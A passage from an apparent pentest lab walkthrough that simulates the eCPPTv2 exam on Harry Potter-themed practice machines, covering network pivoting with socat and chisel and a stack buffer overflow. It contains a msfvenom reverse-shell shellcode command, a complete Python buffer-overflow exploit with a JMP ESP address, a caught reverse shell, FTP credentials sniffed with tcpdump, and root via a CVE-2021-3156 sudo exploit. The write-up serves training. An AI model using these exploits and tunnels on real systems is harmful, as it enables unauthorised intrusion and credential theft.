|D-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-192.168.100.128:31028-&lt;&gt;&lt;&gt;-OK
150 Opening BINARY mode data connection for server_hogwarts (705996 bytes).
100% |*******************************************************************************************************************************************|   689 KiB   32.83 KiB/s  - stalled 

ls server_hogwarts
 server_hogwarts

</code></pre></div></div>

<p>We did a bit of fiddling with this binary and found out that it is a server that is hosted on port 9898 of the machine you run it on, it looks like it is running on the <strong>Fawkes</strong> machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ file ./server_hogwarts
./server_hogwarts: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1d09ce1a9929b282f26770218b8d247716869bd0, for GNU/Linux 3.2.0, not stripped

strace ./server_hogwarts
execve("./server_hogwarts", ["./server_hogwarts"], 0x7fffffffe1b0 /* 41 vars */) = 0
[ Process PID=2030374 runs in 32 bit mode. ]
brk(NULL)                               = 0x80e6000
brk(0x80e67c0)                          = 0x80e67c0
set_thread_area({entry_number=-1, base_addr=0x80e62c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
uname({sysname="Linux", nodename="parrot", ...}) = 0
readlink("/proc/self/exe", "/home/arc4he/Desktop/Arc4he/Pivo"..., 4096) = 52
brk(0x81077c0)                          = 0x81077c0
brk(0x8108000)                          = 0x8108000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
setsockopt(3, SOL_SOCKET, SO_REUSEPORT, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(9898), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 3)                            = 0
accept(3, ^Cstrace: Process 2030374 detached
 &lt;detached ...&gt;

❯ ./server_hogwarts
</code></pre></div></div>

<p>We try to connect on localhost and we see the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nc localhost 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: 

</code></pre></div></div>

<p>At this point we can even think about the possibility of a buffer overflow attack for the following 32-bit binary, le’s try this <strong>gdb</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -c 'print("A"*150)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
❯ nc localhost 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


gdb ./server_hogwarts -r
GNU gdb (Debian 13.1-3) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
[----------------------------------registers-----------------------------------]
EAX: 0xffffcb9c ('A' &lt;repeats 150 times&gt;, "\n")
EBX: 0x41414141 ('AAAA')
ECX: 0xffffcde0 ('A' &lt;repeats 14 times&gt;, "\n")
EDX: 0xffffcc24 ('A' &lt;repeats 14 times&gt;, "\n")
ESI: 0x80b3158 ("../csu/libc-start.c")
EDI: 0xffffd158 ("\nEnter your spell: ")
EBP: 0x41414141 ('AAAA')
ESP: 0xffffcc10 ('A' &lt;repeats 34 times&gt;, "\n")
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffcc10 ('A' &lt;repeats 34 times&gt;, "\n")
0004| 0xffffcc14 ('A' &lt;repeats 30 times&gt;, "\n")
0008| 0xffffcc18 ('A' &lt;repeats 26 times&gt;, "\n")
0012| 0xffffcc1c ('A' &lt;repeats 22 times&gt;, "\n")
0016| 0xffffcc20 ('A' &lt;repeats 18 times&gt;, "\n")
0020| 0xffffcc24 ('A' &lt;repeats 14 times&gt;, "\n")
0024| 0xffffcc28 ("AAAAAAAAAA\n")
0028| 0xffffcc2c ("AAAAAA\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ 
</code></pre></div></div>

<p>It seems that the code in this field is not sanitized. Now we try to obtain the offset:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We create 1024 characters and enter them in the apparently vulnerable field:

gdb-peda$ pattern create 1024
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnC'
gdb-peda$ 


nc localhost 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnC


We found the offset:

gdb-peda$ pattern offset $eip
1094205761 found at offset: 112

</code></pre></div></div>

<p>We check the program protections:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
gdb-peda$ 
</code></pre></div></div>

<p>We can see NX(Non-Executable) disabled this is an error because we can execute malicious code in the memory. To find out if we have control of the <strong>$eip</strong> we can do the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -c 'print("A"*112 + "B"*4 + "C"*100)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
❯ nc localhost 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

[----------------------------------registers-----------------------------------]
EAX: 0xffffcb9c ('A' &lt;repeats 112 times&gt;, "BBBB", 'C' &lt;repeats 84 times&gt;...)
EBX: 0x41414141 ('AAAA')
ECX: 0xffffce30 --&gt; 0xa ('\n')
EDX: 0xffffcc74 --&gt; 0xa ('\n')
ESI: 0x80b3158 ("../csu/libc-start.c")
EDI: 0xffffd158 ("\nEnter your spell: ")
EBP: 0x41414141 ('AAAA')
ESP: 0xffffcc10 ('C' &lt;repeats 100 times&gt;, "\n")
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffcc10 ('C' &lt;repeats 100 times&gt;, "\n")
0004| 0xffffcc14 ('C' &lt;repeats 96 times&gt;, "\n")
0008| 0xffffcc18 ('C' &lt;repeats 92 times&gt;, "\n")
0012| 0xffffcc1c ('C' &lt;repeats 88 times&gt;, "\n")
0016| 0xffffcc20 ('C' &lt;repeats 84 times&gt;, "\n")
0020| 0xffffcc24 ('C' &lt;repeats 80 times&gt;, "\n")
0024| 0xffffcc28 ('C' &lt;repeats 76 times&gt;, "\n")
0028| 0xffffcc2c ('C' &lt;repeats 72 times&gt;, "\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
</code></pre></div></div>

<p>We can see that the value of <strong>$eip</strong> is (‘BBBB’), now we have to look for an address that if I point to it I can do a <strong>JMP ESP</strong> because there is going to be our <strong>shellcode</strong> to do this we can take it to a python script.</p>

<p>First we have to create shellcode with msfvenom. The shellcode has to point to the Nagini machine because it does not see the attacking machine or aragog.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.130 LPORT=5555 -b "\x00" -f py -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 550 bytes
shellcode =  b""
shellcode += b"\xbf\x7f\x63\x59\xb5\xdb\xce\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x12\x83\xc6\x04\x31\x7e\x0e"
shellcode += b"\x03\x01\x6d\xbb\x40\xcc\xaa\xcc\x48\x7d\x0e"
shellcode += b"\x60\xe5\x83\x19\x67\x49\xe5\xd4\xe8\x39\xb0"
shellcode += b"\x56\xd7\xf0\xc2\xde\x51\xf2\xaa\x20\x09\x60"
shellcode += b"\xa8\xc9\x48\x69\xb9\xba\xc4\x88\x71\xda\x86"
shellcode += b"\x1b\x22\x90\x24\x15\x25\x1b\xaa\x77\xcd\xca"
shellcode += b"\x84\x04\x65\x7b\xf4\xc5\x17\x12\x83\xf9\x85"
shellcode += b"\xb7\x1a\x1c\x99\x33\xd0\x5f"
</code></pre></div></div>

<p>Python exploit:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python3

import signal, sys, socket


def def_handler(sig, frame):

    print("\n [!] Leaving the program... \n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)


# Global variables

offset = 112
before_eip = b"A" * offset

eip = b"\x55\x9d\x04\x08" # 8049d55 = &gt; JMP ESP

shellcode =  b""
shellcode += b"\xbd\xb3\xe8\xee\xf8\xdd\xc7\xd9\x74\x24\xf4"
shellcode += b"\x5f\x2b\xc9\xb1\x12\x31\x6f\x12\x03\x6f\x12"
shellcode += b"\x83\x5c\x14\x0c\x0d\x93\x3e\x26\x0d\x80\x83"
shellcode += b"\x9a\xb8\x24\x8d\xfc\x8d\x4e\x40\x7e\x7e\xd7"
shellcode += b"\xea\x40\x4c\x67\x43\xc6\xb7\x0f\x94\x90\x2c"
shellcode += b"\x4d\x7c\xe3\xac\x44\xce\x6a\x4d\xd6\x56\x3d"
shellcode += b"\xdf\x45\x24\xbe\x56\x88\x87\x41\x3a\x22\x76"
shellcode += b"\x6d\xc8\xda\xee\x5e\x01\x78\x86\x29\xbe\x2e"
shellcode += b"\x0b\xa3\xa0\x7e\xa0\x7e\xa2"

after_eip = b"\x90"*32 + shellcode # ESP

ip = "192.168.100.128"
port = 9898

payload = before_eip + eip + after_eip


def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))
    s.send(payload)
    s.close

if __name__ == '__main__':

    exploit()

</code></pre></div></div>

<p>Finally, we have to configure the tunnel so that we receive the revershell. Apart from the configuration mentioned above we have to create another one so that the reverse shell can travel from the Fawke machine to our attackers machine, for this it must pass through the <strong>Nagini</strong> <strong>Aragog</strong> machine and finally ours, for this I will show you the other ssh sessions that I have created in order to get it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Nagini:~# ./socat TCP-LISTEN:5555.fork TCP:10.10.0.128:3333

root@Aragog:~# ./socat TCP-LISTEN:3333.fork TCP:192.168.1.21:443

 nc -nlvp 443
listening on [any] 443 ...

</code></pre></div></div>

<p>Finally we can execute the payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains python3 payload.py
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;-127.0.0.1:1080-&lt;--timeout
|D-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-192.168.100.128:9898-&lt;&gt;&lt;&gt;-OK
 
 nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.31] 50586
whoami
harry

</code></pre></div></div>

<h2 id="got-root-2">Got Root</h2>

<p>After exploiting a Buffer OverFlow we are the user harry, and if we run a <strong>hostname</strong> we can see that we are in a container.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.31] 50586
whoami
harry
hostname
2b1599256ca6

</code></pre></div></div>
<p>We list if the user harry has any permissions in the sudo group.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
User harry may run the following commands on 2b1599256ca6:
    (ALL) NOPASSWD: ALL
sudo /bin/sh
whoami
root
</code></pre></div></div>
<p>Now we searched the directories for information and found the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /root/
ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02  
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:379 errors:0 dropped:0 overruns:0 frame:0
          TX packets:436 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:27456 (26.8 KiB)  TX bytes:47024 (45.9 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

cat note.txt
Hello Admin!!

We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.
</code></pre></div></div>
<p>At this point if someone tries to connect via ftp in the container we can remain listening to see their credentials.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>which tcpdump
/usr/bin/tcpdump

tcpdump -i eth0 port ftp or ftp-data

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
12:34:01.580694 IP 172.17.0.1.55132 &gt; 2b1599256ca6.21: Flags [S], seq 2546197881, win 64240, options [mss 1460,sackOK,TS val 227491800 ecr 0,nop,wscale 7], length 0
12:34:01.580702 IP 2b1599256ca6.21 &gt; 172.17.0.1.55132: Flags [S.], seq 2791639155, ack 2546197882, win 65160, options [mss 1460,sackOK,TS val 2239188086 ecr 227491800,nop,wscale 7], length 0
12:34:01.580714 IP 172.17.0.1.55132 &gt; 2b1599256ca6.21: Flags [.], ack 1, win 502, options [nop,nop,TS val 227491800 ecr 2239188086], length 0
12:34:01.581191 IP 2b1599256ca6.21 &gt; 172.17.0.1.55132: Flags [P.], seq 1:21, ack 1, win 510, options [nop,nop,TS val 2239188087 ecr 227491800], length 20: FTP: 220 (vsFTPd 3.0.3)
12:34:01.581222 IP 172.17.0.1.55132 &gt; 2b1599256ca6.21: Flags [.], ack 21, win 502, options [nop,nop,TS val 227491801 ecr 2239188087], length 0
12:34:01.581266 IP 172.17.0.1.55132 &gt; 2b1599256ca6.21: Flags [P.], seq 1:15, ack 21, win 502, options [nop,nop,TS val 227491801 ecr 2239188087], length 14: FTP: USER neville
12:34:01.581268 IP 2b1599256ca6.21 &gt; 172.17.0.1.55132: Flags [.], ack 15, win 510, options [nop,nop,TS val 2239188087 ecr 227491801], length 0
12:34:01.581290 IP 2b1599256ca6.21 &gt; 172.17.0.1.55132: Flags [P.], seq 21:55, ack 15, win 510, options [nop,nop,TS val 2239188087 ecr 227491801], length 34: FTP: 331 Please specify the password.
12:34:01.581330 IP 172.17.0.1.55132 &gt; 2b1599256ca6.21: Flags [P.], seq 15:30, ack 55, win 502, options [nop,nop,TS val 227491801 ecr 2239188087], length 15: FTP: PASS bL!Bsg3k
12:34:01.623441 IP 2b1599256ca6.21 &gt; 172.17.0.1.55132: Flags [.], ack 30, win 510, options [nop,nop,TS val 2239188129 ecr 227491801], length 0
12:34:04.413377 IP 2b1599256ca6.21 &gt; 172.17.0.1.55132: Flags [P.], seq 55:77, ack 30, win 510, options [nop,nop,TS val 2239190919 ecr 227491801], length 22: FTP: 530 Login incorrect.
12:34:04.413680 IP 172.17.0.1.55132 &gt; 2b1599256ca6.21: Flags [P.], seq 30:36, ack 77, win 502, options [nop,nop,TS val 227494633 ecr 2239190919], length 6: FTP: QUIT
12:34:04.413709 IP 2b1599256ca6.21 &gt; 172.17.0.1.55132: Flags [.], ack 36, win 510, options [nop,nop,TS val 2239190919 ecr 227494633], length 0
12:34:04.413831 IP 2b1599256ca6.21 &gt; 172.17.0.1.55132: Flags [P.], seq 77^C

</code></pre></div></div>

<p>Podemos ver el usuario <strong>neville</strong> y la contraseña <strong>bL!Bsg3k</strong> y recordemos que el puerto ssh en las maquinas fawkes esta abierto podemos intentar conectarnos via ssh con estas credenciales.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains ssh neville@192.168.100.128
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;-127.0.0.1:1080-&lt;--timeout
|D-chain|-&lt;&gt;-127.0.0.1:8888-&lt;&gt;&lt;&gt;-192.168.100.128:22-&lt;&gt;&lt;&gt;-OK
neville@192.168.100.128's password: 
Linux Fawkes 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 27 19:24:01 2024 from 192.168.100.130
neville@Fawkes:~$ export TERM=xterm
neville@Fawkes:~$ whoamio
-bash: whoamio: command not found
neville@Fawkes:~$ whoami
neville
</code></pre></div></div>

<p>To escalate our privilege after much enumeration we can see that the sudo version is <strong>1.8.27</strong> which is vulnerable, for this we have been able to find a script that automates everything.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neville@Fawkes:/dev/shm$ python3 exploit.py 
# whoami
root
# bash
root@Fawkes:/dev/shm# 
</code></pre></div></div>

<p>A summary of what the script takes advantage of:</p>

<p>It exploits a vulnerability known as CVE-2021-3156, also known as “Baron Samedit”. This vulnerability affects several versions of sudo, including version 1.8.27, and allows an unprivileged local attacker to obtain root permissions without authentication. Vulnerability CVE-2021-3156 is related to a stack-based buffer overflow due to a bug in sudo’s argument parsing function. Specifically, by handling escape characters in command arguments, sudo can allow writing outside expected memory limits, which can be exploited to overwrite internal variablesand execute arbitrary code with superuser permissions</p>

<h1 id="matrix">Matrix</h1>

<p>Now it is the turn of the Matrix machine, first as in the previous machines is to create a bash script to scan the network and find other machines on the same interface.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Fawkes:~# ls
chisel	horcrux3.txt  hostDiscovery.sh	socat
root@Fawkes:~# hostname -I
192.168.100.128 172.17.0.1 
root@Fawkes:~# nano hostDiscovery.sh 
root@Fawkes:~# bash hostDiscovery.sh 

Scanning in the network...

[+] Host: 192.168.100.1 - PORT 445 - OPEN
[+] Host: 192.168.100.128 - PORT 21 - OPEN
[+] Host: 192.168.100.128 - PORT 22 - OPEN
[+] Host: 192.168.100.128 - PORT 80 - OPEN
[+] Host: 192.168.100.130 - PORT 22 - OPEN
[+] Host: 192.168.100.130 - PORT 80 - OPEN
[+] Host: 192.168.100.133 - PORT 80 - OPEN
[+] Host: 192.168.100.133 - PORT 22 - OPEN

 All Already :)

root@Fawkes:~# 
</code></pre></div></div>
<p>We have to scan in the same IP range because <strong>172.17.0.1</strong> is the one of dockers, the IP of Matrix machine is <strong>192.168.100.133</strong>. Now we need to create the tunnel to see the Matrix machine from our attacking machines.</p>

<p>Apart from the configuration we already had in order to connect to the Fawkes machine we have to create a separate terminal and set the following instructions:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Aragog
root@Aragog:~# ./socat TCP-LISTEN:2323,fork TCP:192.168.1.21:1234

Nagini
root@Nagini:~# ./socat TCP-LISTEN:3434,fork TCP:10.10.0.128:2323

Fawkes
root@Fawkes:~# ./chisel client 192.168.100.130:3434 R:9999:socks

</code></pre></div></div>

<p>With this configuration we have created a new tunnel to see the Matrix machine. Remember that when chisel clinet connects to the chisel server, we have to add in our attacker machine the port that is being used for <strong>Remote Port Forwading</strong> in our <strong>/etc/proxycahins.conf</strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4    127.0.0.1 9050

# socks5 127.0.0.1 6757
socks5 127.0.0.1 9999
socks5 127.0.0.1 8888
socks5 127.0.0.1 1080
</code></pre></div></div>

<p>And finally we need to create a new proxy for our browser with <strong>FoxyProxy</strong>. As we taught previously</p>

<h2 id="scanreport-3">ScanReport</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>seq 1 65536 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -n -v 192.168.100.133 2&gt;&amp;1 | grep "tcp open"
22/tcp open  ssh
80/tcp open  http
31337/tcp open  Elite

</code></pre></div></div>

<p>We found in the nmap report port 31337 open, first we take a look at the website and try to FUZZ the website, but we found nothing.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> export ALL_PROXY=socks5://127.0.0.1:8888
wfuzz --hc 404 -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt http://192.168.100.133/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.133/FUZZ
Total requests: 1273833

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================
</code></pre></div></div>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/screenMatrix.png" alt="" /></p>

<p>At this point we try to look at the content on port <strong>31337</strong> to see if it changes at all.</p>

<p><img src="/assets/images/2024-08-17-eCPPTv2-simulation/port-31337.png" alt="" /></p>

<p>And yes it has changed we can see anohter content, let’s take a look at the source code:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!-- service --&gt;
								&lt;div class="service"&gt;
									&lt;!--p class="service__text"&gt;ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=&lt;/p--&gt;
								&lt;/div&gt;&lt;!-- End / service --&gt;
</code></pre></div></div>

<p>We find a string encoded in base64, let’s decode this string:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo -n "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhl
ci5tYXRyaXg=" | base64 -d; echo
echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " &gt; Cypher.matrix
</code></pre></div></div>

<p>At first I thought it was a subdomain, but before I tried to put it in the url to see if it was a directory and I was right. When we enter the direcory a file is downloaded:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ ++.&lt;+ +++[- &gt;++++ &lt;]&gt;++ ++++. +++++
+.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;--- -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++.-
-.&lt;++ +[-&gt;+ ++&lt;]&gt; ++++. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- --.&lt;+
+++++ ++[-&gt; +++++ +++&lt;] &gt;++++ +.+++ +++++ +.+++ +++.&lt; +++[- &gt;---&lt; ]&gt;---
---.&lt; +++[- &gt;+++&lt; ]&gt;+++ +.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;-.&lt; +++++ +++[-
&gt;++++ ++++&lt; ]&gt;+++ +++++ +.+++ ++.++ ++++. ----- .&lt;+++ +++++ [-&gt;-- -----
